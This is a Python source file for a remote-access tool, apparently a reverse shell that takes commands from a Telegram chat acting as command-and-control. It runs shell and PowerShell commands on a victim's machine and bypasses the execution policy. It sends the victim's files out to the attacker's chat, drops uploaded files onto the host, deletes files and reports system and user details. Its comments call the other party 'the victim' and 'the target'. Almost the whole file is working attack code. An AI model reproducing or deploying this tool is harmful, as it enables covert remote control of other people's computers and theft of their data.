import platform
import subprocess

# Enter the chat id of the chat you have gone use as channel
CHAT_ID = ""
# Enter the API TOKEN for the telegram bot(the C2C agents)
TOKEN = ""
# The allowed commands for Windows systems
WINDOWS_COMMANDS = {
    "ipconfig": {
        "description": "Display network configuration.",
        "usage": "ipconfig"
    },
    "type": {
        "description": "Display the content of a text file.",
        "usage": "type filename.txt"
    },
    "tasklist": {
        "description": "List running processes.",
        "usage": "tasklist"
    },
    "more": {
        "description": "Display output one screen at a time.",
        "usage": "more filename.txt"
    },
    "rename": {
        "description": "Same as ren command.",
        "usage": "rename old_name new_name"
    },
    "tree": {
        "description": "Display folder structure as a tree.",
        "usage": "tree [path]"
    },
    "schtasks": {
        "description": "Manage scheduled tasks.",
        "usage": "schtasks /parameter"
    },
    "runas": {
        "description": "Run a program as a different user.",
        "usage": "runas /user:username program"
    },
    "ver": {
        "description": "Display Windows version information.",
        "usage": "ver"
    },
    "hostname": {
        "description": "Display the computer's hostname.",
        "usage": "hostname"
    },
    "arp": {
        "description": "View or manipulate ARP cache entries.",
        "usage": "arp [-flag]"
    },
    "tracert": {
        "description": "Trace the route to a host.",
        "usage": "tracert host"
    },
    "nslookup": {
        "description": "Lookup DNS information for a domain.",
        "usage": "nslookup domain"
    },
    "route": {
        "description": "View or manipulate network routes.",
        "usage": "route [parameter]"
    }
}
# The allowed commands for C2C interface
COMMANDS = {
    "download": {
        "description": "This isn't a command, when upload a file to the chat it will fetch it",
        "usage": "Not a command, just upload the file to the chat."
    },
    "!!": {
        "description": "Will execute the command on only one agent bot.",
        "usage": "!![bot username id] [command]"
    },
    "ls": {
        "description": "List files and directories in the current directory.",
        "usage": "ls [path]"
    },
    "ping": {
        "description": "Test network connectivity to a host.",
        "usage": "ping host"
    },
    "cat": {
        "description": "Display the content of a file.",
        "usage": "cat/more [file]"
    },
    "cd": {
        "description": "Change the current directory.",
        "usage": "cd [directory]"
    },
    "pwd": {
        "description": "Show the current working directory.",
        "usage": "pwd"
    },
    "mkdir": {
        "description": "Create a new directory.",
        "usage": "mkdir [directory]"
    },
    "whoami": {
        "description": "Display the current username.",
        "usage": "whoami"
    },
    "touch": {
        "description": "Create a new file.",
        "usage": "touch [filename]"
    },
    "rm": {
        "description": "Remove files or directories.",
        "usage": "rm [file/directory]"
    },
    "mv": {
        "description": "Move files or directories from one place to another.",
        "usage": "mv [source] [destination]"
    },
    "head": {
        "description": "Show the first few lines of a file.",
        "usage": "head [num] [file_name], default 10 lines"
    },
    "echo_to": {
        "description": "Chat with the target without using Telegram itself.",
        "usage": "echo_to [text]"
    },
    "echo": {
        "description": "Display a message or save to a file.",
        "usage": "echo [text] > file or echo [text] >> file or echo [text]"
    },
    "grep": {
        "description": "Search for a pattern in a file.",
        "usage": "grep [pattern] [file]"
    },
    "find": {
        "description": "Search for directories or files in a directory.",
        "usage": "find [dir/file] [starting_path] [name]"
    },
    "upload": {
        "description": "Upload files to the target.",
        "usage": "upload [file_path] or upload [file_paths...]"
    },
    "info": {
        "description": "Display system information.",
        "usage": "info"
    },
    "exit": {
        "description": "Disconnect from the target.",
        "usage": "exit"
    },
    "help": {
        "description": "Show available commands and their usage.",
        "usage": "help or help [command]"
    },
    "powershell": {
        "description": "Execute a PowerShell command.",
        "usage": "powershell [command/script]"
    },
    "bash": {
        "description": "Execute a Bash command.",
        "usage": "bash [command]"
    }
}
# The allowed commands for Linux systems
LINUX_COMMANDS = {
    "arp": {
        "description": "Manipulate ARP cache entries.",
        "usage": "arp [-flag]"
    },
    "ps": {
        "description": "List running processes.",
        "usage": "ps [options]"
    },
    "kill": {
        "description": "Terminate processes by ID or name.",
        "usage": "kill [options] [pid/process_name]"
    },
    "curl": {
        "description": "Transfer data using URLs.",
        "usage": "curl [options] [URL]"
    },
    "ifconfig": {
        "description": "Display network configuration.",
        "usage": "ifconfig [interface]"
    },
    "whois": {
        "description": "Query WHOIS database for domain information.",
        "usage": "whois [domain]"
    },
    "export": {
        "description": "Set environment variables.",
        "usage": "export [variable=value]"
    },
    "traceroute": {
        "description": "Trace the route to a host.",
        "usage": "traceroute [host]"
    },
    "dig": {
        "description": "Query DNS information.",
        "usage": "dig [options] [domain]"
    },
    "df": {
        "description": "Display disk space usage.",
        "usage": "df [options]"
    },
    "du": {
        "description": "Display disk usage for files and directories.",
        "usage": "du [options] [file/directory]"
    },
    "free": {
        "description": "Display memory usage.",
        "usage": "free [options]"
    },
    "file": {
        "description": "Determine file type.",
        "usage": "file [file(s)]"
    },
    "hostname": {
        "description": "Display or set system's host name.",
        "usage": "hostname [new_host_name]"
    },
    "ip": {
        "description": "Show or manipulate routing, devices, policy routing, etc.",
        "usage": "ip [options] [object] [command]"
    },
    "netstat": {
        "description": "Display network connections and statistics.",
        "usage": "netstat [options]"
    },
    "host": {
        "description": "Perform DNS lookups.",
        "usage": "host [options] [domain]"
    },
    "pstree": {
        "description": "Display process tree.",
        "usage": "pstree [options]"
    },
    "lsusb": {
        "description": "List USB devices.",
        "usage": "lsusb [options]"
    },
    "lspci": {
        "description": "List PCI devices.",
        "usage": "lspci [options]"
    },
    "lscpu": {
        "description": "Display information about the CPU architecture.",
        "usage": "lscpu [options]"
    },
    "tar": {
        "description": "Manipulate archive files.",
        "usage": "tar [options] [archive] [files/directories]"
    },
    "gzip": {
        "description": "Compress files.",
        "usage": "gzip [options] [file(s)]"
    },
    "gunzip": {
        "description": "Decompress files compressed with gzip.",
        "usage": "gunzip [options] [file(s)]"
    },
    "zip": {
        "description": "Create and manage zip archives.",
        "usage": "zip [options] [archive] [files/directories]"
    },
    "unzip": {
        "description": "Extract files from zip archives.",
        "usage": "unzip [options] [archive] [files/directories]"
    },
    "rar": {
        "description": "Create and manage rar archives.",
        "usage": "rar [options] [archive] [files/directories]"
    },
    "unrar": {
        "description": "Extract files from rar archives.",
        "usage": "unrar [options] [archive] [files/directories]"
    },
    "wget": {
        "description": "Download files from the internet.",
        "usage": "wget [options] [URL]"
    }
}
# Get the system OS for later use
LIN = False
WIN = False
OS = platform.system()
if OS == "Windows":
    WIN = True
elif OS == "Linux":
    LIN = True
else:
    print(f"Not supported on this OS system...")
    exit(1)


class ReverseShellBot:
    def __init__(self, bot):
        """
        Initialize the bot with all the impotent information.
        :param bot: The telepot bot instance.
        """
        # Initialize the bot instance
        self.bot = bot
        # Performance control
        self.offset = 0
        self.running = True
        self.num = 0
        self.numbers_id = [0]
        self.chunk_size = 4090
        self.bot_username = "!!" + bot.getMe()['username']
        self.preformed = []
        self.output = ""
        # Saving files path
        self.download_dir = f'/tmp/C2C/files' if LIN else os.environ["TEMP"]
        if not os.path.exists(self.download_dir):
            os.makedirs(self.download_dir)
        # Get the command based on the OS
        self.commands_os = LINUX_COMMANDS if LIN else WINDOWS_COMMANDS
        self.lock = threading.Lock()
        # For file system
        self.back = os.getcwd()
        self.cwd = os.getcwd()
        # Thread the message listener
        self.message_thread = threading.Thread(target=self.check_messages, daemon=True)
        self.message_thread.start()

    def check_messages(self):
        """
        Will fetch the updates and start to filter and send to respond by the C2C interface or OS commands
        """
        while self.running:
            # Get the new update by the offset
            try:
                updates = self.bot.getUpdates(offset=self.offset + 1, timeout=250)
            except Exception:
                continue
            # Will pass the last update from the last session or get the lest one id
            if self.num == 0 and len(updates) == 0:
                continue
            elif self.num == 0:
                self.offset = updates[-1]["update_id"] - 1
                self.num += 1
                continue
            # Start filter the updates by id and status
            for update in updates:
                if "my_chat_member" in update:
                    continue
                chat_id = update['message']['chat']['id']
                if chat_id == int(CHAT_ID) and update['update_id'] > self.numbers_id[0]:
                    if 'document' in update['message']:
                        # Download file from the chat
                        self.save_file(update, chat_id)
                    elif "new_chat_title" not in update["message"]:
                        # Get the commands and execute by the use of the script
                        message = update['message']['text']
                        message = message.replace("'", "").replace('"', '')
                        message_split = message.split(" ")
                        message_split = [line for line in message_split if "" != line]
                        # Will check if it is a C2C command or shell and work by the need
                        if self.shell_statement(message, message_split, chat_id, update):
                            if not message.startswith("/") and message.strip():
                                self.preformed.append(update["update_id"])
                                if LIN:
                                    if "|" in message:
                                        self.output = f"Dont use pipe (|)..."
                                        self.send_response(chat_id)
                                    else:
                                        self.execute_command(message_split, mode=False)
                                elif WIN:
                                    if "|" in message:
                                        self.output = f"Dont use pipe (|)..."
                                        self.send_response(chat_id)
                                    else:
                                        self.execute_command(message_split)
                                self.send_response(chat_id)
            # Update the offset for not using old updates
            if updates:
                self.offset = updates[-1]["update_id"]

    def execute_command(self, command_split: list, mode: bool = True, input_to_put: str = None):
        """
        Execute the command via the need of the command
        :param command_split: The list of the command
        :param mode: The type of shell to use with bool
        :param input_to_put:The input to insert to the shell
        """
        try:
            if input_to_put is not None:
                process = subprocess.run(command_split, shell=mode, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                         text=True)
                self.lock.acquire()
                self.output = process.stdout
                self.lock.release()
            else:
                process = subprocess.run(command_split, input=input_to_put, shell=mode, stdout=subprocess.PIPE,
                                         stderr=subprocess.STDOUT,
                                         text=True)
                self.lock.acquire()
                self.output = process.stdout
                self.lock.release()
        except subprocess.CalledProcessError as e:
            self.lock.acquire()
            self.output = f"Error: {e.output}"
            self.lock.release()

    def download_file(self, file_id: int, file_path: str):
        """
        Download the file from the chat
        :param file_id: The file id that was sent in the chat
        :param file_path: The file path to download from the chat
        """
        try:
            file_info = self.bot.getFile(file_id)
            file_url = file_info['file_path']

            with open(file_path, 'wb') as f:
                self.bot.download_file(file_url, dest=f)
        except Exception as e:
            self.output = f"ERROR: {e}"

    def save_file(self, update_message, chat_id):
        """
        Save the file from the chat
        :param update_message: The update id
        :param chat_id: The chat id
        """
        try:
            document = update_message['message']['document']
            file_name = document['file_name']
            file_id = document['file_id']
            file_path = os.path.join(self.download_dir, file_name)
            self.download_file(file_id, file_path)
            self.output = f"File '{file_name}' downloaded to '{file_path}'"
        except Exception as e:
            self.output = f"ERROR: {e}"
        self.send_response(chat_id)

    def send_response(self, chat_id):
        """
        Get the output from the commands and send in the chat
        :param chat_id: The chat id to send to
        """
        self.lock.acquire()
        response = self.output
        self.lock.release()
        if response == "":
            response = "There is not a text to reply."
        if len(response) > self.chunk_size:
            response_list = [response[i:i + self.chunk_size] for i in range(0, len(response), self.chunk_size)]
            amounts = 1
            if len(response_list) > 5:
                amounts = len(response_list) % 5 + 1 + (len(response_list) % 5)
            for i, amount in zip(response_list, range(amounts)):
                if i is None:
                    break
                elif amount % 5 == 0 and amount != 0:
                    self.output = "I getting to the sending speed of telegram.\nFor the script it will send in couple seconds"
                    self.send_response(int(CHAT_ID))
                    time.sleep(16)
                    continue
                self.bot.sendMessage(chat_id, i)
        else:
            self.bot.sendMessage(chat_id, response)
            time.sleep(4)

    def stop(self):
        """
        Stop the thread and the loop
        """
        self.running = False
        self.message_thread.join()

    @staticmethod
    def is_file_bigger_than_2gb(file_path):
        """
        Check if the file is bigger the 2GB
        :param file_path: The file path to check if it bigger
        """
        file_size = os.path.getsize(file_path)
        file_size_gb = file_size / (1024 ** 3)
        return file_size_gb > 2

    def return_path(self, path: str) -> str:
        """
        Getting the fixed path by the OS
        :param path: The path to rewrite
        :return: The new path
        """
        if path.startswith('"'):
            self.return_path(path[1:])
        elif path.startswith("'"):
            self.return_path(path[1:])
        elif path.endswith('"'):
            self.return_path(path[:-1])
        elif path.endswith("'"):
            self.return_path(path[:-1])
        if WIN:
            if "-" == path:
                return self.back
            if path[1::].startswith(":\\"):
                return path
            elif path.startswith(".."):
                return ".\\" + path
            elif path.startswith(".\\"):
                return path
            else:
                return ".\\" + path
        elif LIN:
            if "-" == path:
                return self.back
            elif path.startswith("/"):
                return path
            elif path.startswith(".."):
                return "./" + path
            elif path.startswith("./"):
                return path
            else:
                return "./" + path

    def check_path(self, start_path, chat_id):
        """
        Check if the command could run on this OS and answer by the need to this path.
        :param start_path: The path to check
        :param chat_id: The chat id for sending to
        """
        path = start_path
        error_message = ""
        if LIN and "\\" in path:
            error_message = f"This Linux does not support this path"
        elif "/" in path and WIN:
            error_message = f"This Windows does not support this path"
        path = self.return_path(start_path)
        if error_message:
            self.output = error_message
            self.send_response(chat_id)
            return True, None

        return False, path

    def shell_statement(self, command: str, command_split: list, chat_id, update) -> bool:
        """
        The C2C command statement for execute the right command.
        :param command: The command text.
        :param command_split: The list of the command text.
        :param chat_id: The chat id.
        :param update: The update dictionary of the chat.
        :return: Bool
        """
        # Execute the command for specif bot
        if command.startswith("!!"):
            if command_split[0] != self.bot_username:
                return False
            command = command[len(command_split[0]) + 1::]
            command_split.pop(0)
            if len(command_split) == 0:
                self.output = "There isn't a command with this user call."
                self.send_response(chat_id)
                return False
        # Navigate
        if command_split[0] == "cd":
            try:
                check, path = self.check_path(command_split[-1], chat_id)
                if check:
                    return False
                self.back = os.getcwd()
                os.chdir(path)
                self.cwd = os.getcwd()
                self.output = f"You transfer to this directory: {os.getcwd()}"
            except Exception as e:
                self.output = f"ERROR: {e}"

            self.send_response(chat_id)
            return False
        # System information
        elif command == "info":
            system_info = platform.uname()
            self.output = f"""System Information:
Operating System: {system_info.system}
Node Name: {system_info.node}
Release: {system_info.release}
Version: {system_info.version}
Machine: {system_info.machine}
Processor: {system_info.processor}
User: {os.getlogin()}
This is your system information.
"""
            self.send_response(chat_id)
            return False
        # The current username
        elif command == "whoami":
            self.output = getpass.getuser()
            self.send_response(chat_id)
            return False
        # upload one file
        elif command_split[0] == "upload" and len(command_split[1::]) == 1:
            try:
                if not self.is_file_bigger_than_2gb(command_split[-1]):
                    check, path = self.check_path(command_split[-1], chat_id)
                    if check:
                        return False
                    with open(path, 'rb') as file:
                        self.bot.sendDocument(CHAT_ID, file)
                    self.output = "Here the file..."
                else:
                    self.output = "The file is higher then 2 GB"
            except Exception as e:
                self.output = f"ERROR: {e}"
            finally:
                self.send_response(chat_id)
                return False
        # upload multi files
        elif command_split[0] == "upload" and len(command_split[1::]) >= 2:
            for path in command_split[1::]:
                try:
                    check, path = self.check_path(path, chat_id)
                    if check:
                        return False
                    if not self.is_file_bigger_than_2gb(path):
                        with open(path, 'rb') as file:
                            self.bot.sendDocument(CHAT_ID, file)
                        self.output = f"Here the file {path}"
                    else:
                        self.output = "The file is higher then 2 GB"
                except Exception as e:
                    self.output = f"ERROR: {e}"
                finally:
                    self.send_response(chat_id)
                    continue
            return False
        # Show the current working directory
        elif command_split[0] == "pwd":
            self.output = self.cwd
            self.send_response(chat_id)
            return False
        # working
        elif command_split[0] == "mkdir" and len(command_split) == 2:
            try:
                check, path = self.check_path(command_split[-1], chat_id)
                if check:
                    return False
                os.makedirs(path)
                self.output = f"Directory {command_split[-1]} created successfully."
            except OSError as e:
                self.output = f"Error creating directory: {e}"
            finally:
                self.send_response(chat_id)
                return False
        # working
        elif command_split[0] == "mkdir" and len(command_split) > 2:
            command_split = command_split[1::]
            for path in command_split:
                check, path = self.check_path(path, chat_id)
                if check:
                    return False
                try:
                    os.makedirs(self.return_path(path))
                    self.output = f"Directory {path} created successfully."
                except OSError as e:
                    self.output = f"Error creating directory: {e}"
                finally:
                    self.send_response(chat_id)
            return False
        # remove file
        elif "rm" == command_split[0] and len(command_split) == 2:
            check, path = self.check_path(command_split[-1], chat_id)
            if check:
                return False
            if os.path.isdir(path):
                try:
                    shutil.rmtree(path)
                    self.output = f"Directory {path} deleted successfully.\n"
                except Exception as e:
                    self.output = f"Error deleting directory: {e}\n"
                finally:
                    self.send_response(chat_id)
                    return False

            elif os.path.isfile(path):
                try:
                    os.remove(path)
                    self.output = f"The file {path} is deleted..."
                except Exception as e:
                    self.output = f"Error deleting file: {e}"
                finally:
                    self.send_response(chat_id)
                    return False
        # remove files
        elif "rm" == command_split[0] and len(command_split) > 2:
            self.output = ""
            for path in command_split[1::]:
                check, path = self.check_path(path, chat_id)
                if check:
                    return False
                if os.path.isdir(path):
                    try:
                        shutil.rmtree(path)
                        self.output += f"Directory {path} deleted successfully.\n"
                    except Exception as e:
                        self.output += f"Error deleting directory: {e}\n"
                elif os.path.isfile(path):
                    try:
                        os.remove(path)
                        self.output += f"The file {path} is deleted...\n"
                    except Exception as e:
                        self.output += f"Error deleting file: {e}\n"
            self.send_response(chat_id)
            return False
        # move file to a new path
        elif command_split[0] == "mv" and len(command_split) == 3:
            try:
                check, source_path = self.check_path(command_split[1], chat_id)
                if check:
                    return False
                check, destination_path = self.check_path(command_split[-1], chat_id)
                if check:
                    return False
                if os.path.isfile(source_path) and os.path.isdir(destination_path):
                    shutil.move(source_path, destination_path)
                    self.output += f"Moved the file '{source_path}' to '{destination_path}'.\n"
                elif os.path.isdir(source_path) and os.path.isdir(destination_path):
                    shutil.move(source_path, os.path.join(destination_path, os.path.basename(source_path)))
                    self.output += f"Moved the directory '{source_path}' to '{destination_path}'.\n"
                else:
                    self.output += f"This is not a file or directory '{source_path}' to '{destination_path}'.\n"
            except Exception as e:
                self.output += f"ERROR: {e}"
            finally:
                self.send_response(chat_id)
                return False
        # move files to a new path
        elif command_split[0] == "mv" and len(command_split) > 3:
            self.output = ""

            for path in command_split[1:-1:]:
                try:
                    check, source_path = self.check_path(path, chat_id)
                    if check:
                        return False
                    check, destination_path = self.check_path(command_split[-1], chat_id)
                    if check:
                        return False
                    if os.path.isfile(source_path) and os.path.isdir(destination_path):
                        shutil.move(source_path, destination_path)
                        self.output += f"Moved the file '{source_path}' to '{destination_path}'.\n"
                    elif os.path.isdir(source_path) and os.path.isdir(destination_path):
                        shutil.move(source_path, os.path.join(destination_path, os.path.basename(source_path)))
                        self.output += f"Moved the directory '{source_path}' to '{destination_path}'.\n"
                    else:
                        self.output += f"This is not a file or directory '{source_path}' to '{destination_path}'.\n"
                except Exception as e:
                    self.output += f"ERROR: {e}"
            self.send_response(chat_id)
            return False
        # Rename file name
        elif command_split[0] == "ren" and len(command_split) == 3:
            try:
                check, old_path = self.check_path(command_split[1], chat_id)
                if check:
                    return False
                check, des_path = self.check_path(command_split[-1], chat_id)
                if check:
                    return False
                new_path = os.path.join(os.path.dirname(old_path), des_path)
                shutil.move(old_path, new_path)
                self.output = f"Renamed '{old_path}' to '{new_path}' successfully."
            except Exception as e:
                self.output = f"ERROR: {e}"
            finally:
                self.send_response(chat_id)
                return False
        # Print the file text
        elif command_split[0] == "cat" and len(command_split) == 2:
            try:
                check, path = self.check_path(command_split[1], chat_id)
                if check:
                    return False
                with open(path, "r") as file:
                    self.output = file.read()
            except Exception as e:
                self.output = f"ERROR: {e}"
            finally:
                self.send_response(chat_id)
                return False
        # Create few files
        elif command_split[0] == "touch" and len(command_split) > 2:
            self.output = ""
            success_count = 0
            error_count = 0
            paths = command_split[1::]
            for path in paths:
                try:
                    check, path = self.check_path(path, chat_id)
                    if check:
                        error_count += 1
                        continue
                    with open(path, "w") as file:
                        file.write("")
                    self.output += f"The file {path} created successfully.\n"
                    success_count += 1
                except Exception as e:
                    self.output += f"ERROR: {e}\n"
                    error_count += 1
            self.output += f"\n{success_count} files created successfully.\n"
            if error_count > 0:
                self.output += f"{error_count} errors occurred."
            self.send_response(chat_id)
            return False
        # Create one file
        elif command_split[0] == "touch" and len(command_split) == 2:
            try:
                check, path = self.check_path(command_split[-1], chat_id)
                if check:
                    return False
                with open(path, "w") as file:
                    file.write("")
                self.output = f"The file {path} created successfully."
            except Exception as e:
                self.output = f"ERROR: {e}"
            finally:
                self.send_response(chat_id)
                return False
        # Create a chat with the victim
        elif command_split[0] == "echo_to":
            print("Attacker:\n" + " ".join(command_split[1:]))
            self.output = "Target:\n" + input("Enter answer: ")
            print(self.output.replace("Target:", "Me:"))
            self.send_response(chat_id)
            return False
        # Print or append or insert text
        elif command_split[0] == "echo":
            try:
                if ">" == command_split[-2]:
                    check, path = self.check_path(command_split[-1], chat_id)
                    if check:
                        return False
                    with open(path, "w") as file:
                        index = command_split.index(">")
                        textwrap = " ".join(command_split[1:index])
                        file.write(textwrap)
                    self.output = f"The text is inserted to the file {command_split[-1]}..."
                elif ">>" == command_split[-2]:
                    check, path = self.check_path(command_split[-1], chat_id)
                    if check:
                        return False
                    with open(path, "a") as file:
                        index = command_split.index(">>")
                        textwrap = "\n" + " ".join(command_split[1:index])
                        file.write(textwrap)
                    self.output = f"The text is appended to the file {command_split[-1]}..."
                else:
                    self.output = " ".join(command_split[1:])
            except Exception as e:
                self.output = f"ERROR: {e}"
            finally:
                self.send_response(chat_id)
                return False
        # Print the number of lines
        elif command_split[0] == "head":
            try:
                textwrap = ""
                if len(command_split) == 2:
                    check, path = self.check_path(command_split[-1], chat_id)
                    if check:
                        return False
                    with open(path, 'r') as file:
                        for line_num, line in enumerate(file.readlines(), start=1):
                            if line_num > 10 or line is None:
                                break
                            textwrap += line
                        self.output = textwrap
                elif len(command_split) > 2:
                    check, path = self.check_path(command_split[-1], chat_id)
                    if check:
                        return False
                    with open(path, 'r') as file:
                        for line_num, line in enumerate(file.readlines(), start=1):
                            if line_num > int(command_split[-2]):
                                break
                            textwrap += "\n" + line
                        self.output = textwrap
                else:
                    self.output = "There isn't a file in the command..."
            except FileNotFoundError:
                self.output = f"File '{command_split[-1]}' not found."
            except Exception as e:
                self.output = f"An error occurred: {e}"
            finally:
                self.send_response(chat_id)
                return False
        # Disconnect from the bots
        elif command_split[0] == "exit":
            self.output = "Disconnecting from the target"
            self.send_response(chat_id)
            self.stop()
            exit()
        # Print the list dir of this path
        elif command_split[0] == "ls" and len(command_split) == 1:
            try:
                output = os.listdir("./")
                self.output = "\n-) ".join(output)
                self.send_response(chat_id)
            except Exception as e:
                self.output = f"ERROR: {e}"
                self.send_response(chat_id)
            return False
        # Print the list dir of path
        elif command_split[0] == "ls" and len(command_split) == 2:
            try:
                check, path = self.check_path(command_split[-1], chat_id)
                if check:
                    return False
                output = os.listdir(path)
                self.output = "\n-) ".join(output)
                self.send_response(chat_id)
            except Exception as e:
                self.output = f"ERROR: {e}"
                self.send_response(chat_id)
            return False
        # Powershell enable the script execution and execute a script
        elif command_split[0] in "powershell" and len(command_split) == 3 and command_split[-1] == "script_enable":
            if LIN:
                return False
            try:
                script_path = " ".join(command_split[1:-1])
                command_final = f"powershell -ExecutionPolicy Bypass -File {script_path}".split(" ")
                self.execute_command(command_final, mode=False)
            except Exception as e:
                self.output = f"ERROR: {e}"
            finally:
                self.send_response(chat_id)
                return False
        # Powershell enable the script execution
        elif command_split[0] in "powershell" and len(command_split) == 2 and command_split[-1] == "script_enable":
            if LIN:
                return False
            try:
                command_final = f"powershell -Command Set-ExecutionPolicy Bypass -Scope Process".split(" ")
                self.execute_command(command_final, mode=False)
                self.output = f"The command preformed: \n{self.output}"
            except Exception as e:
                self.output = f"ERROR: {e}"
            finally:
                self.send_response(chat_id)
                return False
        # Powershell execute a script or command base on the command
        elif command_split[0] in "powershell":
            if ".ps1" in command_split[-1].lower():
                if LIN:
                    return False
                try:
                    command_final = f"powershell -File {' '.join(command_split[1::])}".split(" ")
                    self.execute_command(command_final, mode=False)
                    self.output = f"The command preformed: \n{self.output}"
                except Exception as e:
                    self.output = f"ERROR: {e}"
                finally:
                    self.send_response(chat_id)
                    return False
            else:
                if LIN:
                    return False
                try:
                    command_final = f"powershell -Command {' '.join(command_split[1::])}".split(" ")
                    self.execute_command(command_final, mode=False)
                    self.output = f"The command preformed: \n{self.output}"
                except Exception as e:
                    self.output = f"ERROR: {e}"
                finally:
                    self.send_response(chat_id)
                    return False
        # Execute bash script
        elif command_split[0] in "bash" and len(command_split) == 2:
            if WIN:
                return False
            try:
                command_final = f"bash {' '.join(command_split[1::])}".split(" ")
                self.execute_command(command_final, mode=False)
                self.output = f"The command preformed: \n{self.output}"
            except Exception as e:
                self.output = f"ERROR: {e}"
            finally:
                self.send_response(chat_id)
                return False
        # Get text and amount in file
        elif command_split[0] in "grep":
            try:
                check, path = self.check_path(command_split[-1], chat_id)
                if check:
                    return False
                search_word = " ".join(command_split[1:-1]).replace('"', "").replace("'", "") if len(
                    command_split[1:-1]) > 1 \
                    else command_split[1].replace('"', "").replace("'", "")
                with open(path, "r") as file:
                    total_occurrences = file.read().count(search_word)
                    output = "\n".join([line for line in file.readlines() if search_word in line])
                    total = f"Total occurrences of '{search_word}': {total_occurrences}\n{output}"
                    self.output = total
            except Exception as e:
                self.output = f"ERROR: {e}"
            finally:
                self.send_response(chat_id)
                return False
        # Find file or directory
        elif command_split[0] in "find":
            try:
                if command_split[1].lower() == "dir":
                    directory_paths = []
                    for root, dirs, files in os.walk(lambda x: self.return_path(command_split[2]) if command_split[
                                                                                                         2] != "." else ".\\" if WIN else "./"):
                        for d in dirs:
                            if d == command_split[-1]:
                                path = os.path.join(root, d)
                                path = path[2:] if path.startswith(".\\.\\") else path if WIN else \
                                    path[2:] if path.startswith("././") else path
                                directory_paths.append(path)

                    if not directory_paths:
                        self.output = f"No directories found in {command_split[2]}"
                    else:
                        self.output = "\n".join(directory_paths)

                elif command_split[1].lower() == "file":
                    file_paths = []
                    for root, dirs, files in os.walk(self.return_path(command_split[2])):
                        for file in files:
                            if file == command_split[-1]:
                                path = os.path.join(root, file)
                                path = path[2:] if path.startswith(".\\.\\") else path if WIN else \
                                    path[2:] if path.startswith("././") else path
                                file_paths.append(path)

                    if not file_paths:
                        self.output = f"No files found in {command_split[2]}"
                    else:
                        self.output = "\n".join(file_paths)
                else:
                    self.output = f"This isn't an option like that."
            except Exception as e:
                self.output = f"ERROR: {e}"
            finally:
                self.send_response(chat_id)
                return False
        # Working at Windows not yet in Linux
        # Editor to create a file
        elif command_split[0] == "editor" and len(command_split) >= 1:
            if LIN:
                self.output = "This editor is not working yet in Linux!!"
                self.send_response(chat_id)
                return False
            if len(command_split) == 1:
                self.output = "You're missing a file name..."
                self.send_response(chat_id)
                return False
            check, path = self.check_path(command_split[-1], chat_id)
            self.output = f"Starting the editor.\nAt file: {path}"
            self.send_response(chat_id)
            if check:
                return False
            if os.path.isfile(path):
                try:
                    with open(path, "r") as file:
                        self.output = file.read() + "\n Note: If you want to save this text, copy it and paste it at the start..."
                except Exception as e:
                    self.output = f"ERROR: {e}"
                finally:
                    self.send_response(chat_id)
            update_id = update["update_id"]
            end = False
            textwrap = ""
            while not end:
                try:
                    updates = self.bot.getUpdates(offset=update_id, timeout=250)
                except Exception:
                    continue
                for update in updates:
                    if "my_chat_member" in update:
                        continue
                    chat_id = update['message']['chat']['id']
                    if chat_id == int(CHAT_ID):
                        if update_id < update["update_id"]:
                            if "new_chat_title" not in update["message"] or chat_id not in self.numbers_id:
                                self.numbers_id.append(chat_id)
                                if update['message']['text'] == "stop":
                                    self.numbers_id[0] = updates[-1]["update_id"]
                                    end = True
                                    break
                                textwrap += update['message']['text'] + "\n"
                if updates:
                    update_id = updates[-1]["update_id"]
            try:
                with open(os.path.join(path), "w") as file:
                    file.write(textwrap)
                self.output = "Text saved successfully."
            except Exception as e:
                self.output = f"ERROR: {e}"
            finally:
                self.send_response(chat_id)
                return False
        # Help
        elif command_split[0] == "help" and len(command_split) == 1:
            text = "\nC2C commands:\n"
            for key in COMMANDS.keys():
                text += f"{key}:\nDescription: {COMMANDS[key]['description']}\nUsage: {COMMANDS[key]['usage']}\n"
            text += "\n\nShell commands:\n"
            for key in self.commands_os.keys():
                text += f"{key}:\nDescription: {self.commands_os[key]['description']}\nUsage: {self.commands_os[key]['usage']}\n"
            self.output = text
            self.send_response(chat_id)
            return False
        # Help for a command
        elif command_split[0] == "help" and len(command_split) == 2:
            if command_split[-1] in COMMANDS.keys():
                self.output = f"C2C command:\n{command_split[-1]}:\nDescription: {COMMANDS[command_split[-1]]['description']}\nUsage: {COMMANDS[command_split[-1]]['usage']}\n"
            elif command_split[-1] in self.commands_os.keys():
                self.output = f"Shell command:\n{command_split[-1]}:\nDescription: {self.commands_os[command_split[-1]]['description']}\nUsage: {self.commands_os[command_split[-1]]['usage']}\n"
            else:
                self.output = f"{command_split[-1]}: Command not found"
            self.send_response(chat_id)
            return False
        elif command_split[0] == "ping":
            if len(command_split) == 2:
                final_command = f"ping -c4 {command_split[-1]}" if LIN else f"ping {command_split[-1]}"
                self.execute_command(final_command.split(" "), mode=False)
            elif len(command_split) > 2:
                self.output = "There is an error with the command ping to much text"
            self.send_response(chat_id)
            return False
        # Execute the command of the os or send answer of non a command
        else:
            if command_split[0] in self.commands_os.keys():
                return True
            self.output = "The command doesn't work in this OS system... \nTry again"
            self.send_response(chat_id)
            return False


def install_package(package_name):
    """
    Will install the packages requirements for the script to run.
    :param package_name: The package name
    :return:
    """
    while True:
        try:
            subprocess.run(["pip", "install", package_name], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=True)
            break
        except subprocess.CalledProcessError:
            continue
        except Exception:
            continue

def reverse_shell():
    """
    The process of the reverse shell
    """
    bot = telepot.Bot(TOKEN)
    reverse_shell_bot = ReverseShellBot(bot)
    try:
        while True:
            pass
    except KeyboardInterrupt:
        reverse_shell_bot.stop()


if __name__ == "__main__":
    packages = ["telepot", "urllib3==1.24.1"]
    for package in packages:
        install_package(package)
    import getpass
    import os
    import time
    import telepot
    import threading
    import shutil
    # Start the shell
    reverse_shell()
